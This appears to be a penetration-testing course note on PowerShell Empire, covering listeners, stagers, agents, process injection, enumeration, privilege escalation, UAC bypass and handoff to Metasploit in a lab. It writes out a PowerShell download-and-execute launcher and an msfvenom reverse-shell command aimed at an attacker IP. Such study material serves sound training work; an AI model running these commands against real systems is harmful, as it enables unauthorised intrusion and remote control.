# Content

- [Content](#content)
  - [Installation, Setup, and Usage](#installation-setup-and-usage)
    - [PowerShell Empire Syntax](#powershell-empire-syntax)
    - [Listeners and Stagers](#listeners-and-stagers)
    - [The Empire Agent](#the-empire-agent)
  - [PowerShell Modules](#powershell-modules)
    - [Situational Awareness](#situational-awareness)
    - [Credentials and Privilege Escalation](#credentials-and-privilege-escalation)
  - [Switching Between Empire and Metasploit](#switching-between-empire-and-metasploit)

  
## Installation, Setup, and Usage

- Because in Kali Linux, PowerShell is already installed, we can use it directly.
  ```bash
  sudo powershell-empire server
  sudo powershell-empire client
  ```
  ![Picture](../23.%20PowerShell%20Empire/Image/1.png)
  ![Picture](../23.%20PowerShell%20Empire/Image/2.png)

### PowerShell Empire Syntax

- We can use help to list various commands available within Empire, including listeners, stagers, agents, and modules.
  ![Picture](../23.%20PowerShell%20Empire/Image/3.png)

### Listeners and Stagers

- We will first enter the ``` listeners `````` context, then use ``` uselistener http ```.
  ![Picture](../23.%20PowerShell%20Empire/Image/4.png)
  ![Picture](../23.%20PowerShell%20Empire/Image/5.png)
- Now we change port to 80. 
  ```bash
  set Port 80
  ```
  ![Picture](../23.%20PowerShell%20Empire/Image/6.png)
- Once the options are set, we can start the listener with the ``` execute ``` command and return to the main listener menu with ``` back ```.
  ![Picture](../23.%20PowerShell%20Empire/Image/7.png)
- Empire supports stagers for Windows, Linux, and OS X. 
- Windows stagers include support for standard DLLs, HTLM Applications, Microsoft Office macros, and more exotic stagers such as ``` windows/ducky ``` for use with the USB Rubber Ducky.
- To get an idea of how this works, let’s try out the windows/launcher_bat stager. After selecting the stager, we can review the options with the ``` info ``` command.
  ```bash
  usestager windows/launcher_bat
  ```
  ![Picture](../23.%20PowerShell%20Empire/Image/8.png)
- We can configure the Listener parameter with the ``` set ``` command followed by the name of the listener we just created. Finally, we’ll create the stager with ``` execute ```
  ![Picture](../23.%20PowerShell%20Empire/Image/9.png)
- To better understand the stager we just created, let’s take a look at the partial content of the generated ``` launcher.bat ``` file.
  ![Picture](../23.%20PowerShell%20Empire/Image/10.png)

### The Empire Agent

- Now that we have our listener running and our stager prepared, we will need to deploy an agent on the victim. An agent is simply the final payload retrieved by the stager, and it allows us to execute commands and interact with the system. The stager (in this case the .bat file) deletes itself and exits once it finishes execution.
- Once the agent is operational on the target, it will set up an AES-encrypted communication channel with the listener using the data portion of the HTTP GET and POST requests.
- We will first copy the launcher.bat script to the Windows 10 workstation and execute it from a command prompt.
- Because the command in file .bat just run in Linux, so if we want to run it in windows, we need to change the content of file .bat.
  ```bash
  @echo off
  powershell.exe -ExecutionPolicy Bypass -Command "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iex ((New-Object Net.WebClient).DownloadString('http://192.168.50.156:80/download/powershell/Om1hdHRpZmVzdGF0aW9uIGV0dw=='))"
  ```
  ![Picture](../23.%20PowerShell%20Empire/Image/11.png)
- After successful execution of the launcher script, an initial agent call will appear in our Empire session.
  ![Picture](../23.%20PowerShell%20Empire/Image/12.png)
- Next, we can use the agents command to display all active agents.
  ![Picture](../23.%20PowerShell%20Empire/Image/13.png)
- Now, we can use the interact command followed by the agent name to interact with our agent and execute commands.
- In this case, we will run sysinfo to retrieve information about the compromised host.
  ![Picture](../23.%20PowerShell%20Empire/Image/14.png)
- As with a meterpreter payload, Empire allows us to migrate our payload into a different process. 
- We can do that by first using ps to view all running processes. Once we choose our target 
process, we’ll migrate the payload with psinject command, including the name of the listener and the process id as our command arguments.
  ![Picture](../23.%20PowerShell%20Empire/Image/15.png)
  ![Picture](../23.%20PowerShell%20Empire/Image/16.png)
  ![Picture](../23.%20PowerShell%20Empire/Image/17.png)
- It is important to note that, unlike the migration feature of the meterpreter payload, once the process migration is completed, the original Empire agent remains active and we must manually switch to the newly created agent.
  ![Picture](../23.%20PowerShell%20Empire/Image/18.png)

## PowerShell Modules

- The power of Empire agents lies in the various modules offered by the framework. We can list all available modules by running usemodule.
  ![Picture](../23.%20PowerShell%20Empire/Image/19.png)

### Situational Awareness

- To begin, let’s explore the situational_awareness category. While there are many methods and 
commands for performing network enumeration, the primary focus of this category is on local 
client and Active Directory enumeration.
- For example, we can use the ``` get_user ``` module and then issue the ``` info ``` command to display information about the module.
  ```bash
  usemodule powershell/situational_awareness/network/powerview/get_user
  ```
  ![Picture](../23.%20PowerShell%20Empire/Image/20.png)
- We could set any number of filtering options or ``` execute ``` the module.
  ![Picture](../23.%20PowerShell%20Empire/Image/21.png)

### Credentials and Privilege Escalation

- The privesc category contains privilege escalation modules. One of the more interesting modules in this group is ``` powerup/allchecks ```.
- It uses several techniques based on misconfigurations such as unquoted service paths, improper permissions on service executables, and much more.
  ```bash
  usemodule powershell/privesc/powerup/allchecks
  ```
  ![Picture](../23.%20PowerShell%20Empire/Image/22.png)
- We can execute the module and review the results.
  ![Picture](../23.%20PowerShell%20Empire/Image/23.png)
- The bypassuac_fodhelper module is quite useful if we have access to a local administrator account. Depending on the local Windows version, this module can bypass UAC and launch a high-integrity PowerShell Empire agent.
  ```bash
  usemodule powershell/privesc/bypassuac_fodhelper
  ```
  ![Picture](../23.%20PowerShell%20Empire/Image/24.png)
  ![Picture](../23.%20PowerShell%20Empire/Image/25.png)
  ![Picture](../23.%20PowerShell%20Empire/Image/26.png)

## Switching Between Empire and Metasploit

- If a PowerShell Empire agent is active on the host, we can use msfvenom to generate a 
meterpreter reverse shell as an executable.
  ```bash
  msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.50.156 LPORT=7777 -f exe -o met.exe
  ```
  ![Picture](../23.%20PowerShell%20Empire/Image/27.png)
- We then set up a Metasploit listener using the multi/handler module and the previously-chosen settings.
  ![Picture](../23.%20PowerShell%20Empire/Image/28.png)
- Now we switch back to our PowerShell Empire shell and upload the executable.
  ![Picture](../23.%20PowerShell%20Empire/Image/29.png)
  ![Picture](../23.%20PowerShell%20Empire/Image/30.png)
  ![Picture](../23.%20PowerShell%20Empire/Image/31.png)
- After uploading the executable, we execute it in windows 10.
- With the executable running, we’ll switch back to our meterpreter listener and watch the incoming shell.
  ![Picture](../23.%20PowerShell%20Empire/Image/32.png)
- Reversing this process to connect to an Empire agent from an existing meterpreter session is also simple. 
- We can create a launcher (.bat format) and use meterpreter to upload and execute it. 
- First we’ll create the launcher using Empire.
  ![Picture](../23.%20PowerShell%20Empire/Image/33.png)
  ![Picture](../23.%20PowerShell%20Empire/Image/34.png)
- Then we can check the listener in Empire.
  ![Picture](../23.%20PowerShell%20Empire/Image/35.png)
  ![Picture](../23.%20PowerShell%20Empire/Image/36.png)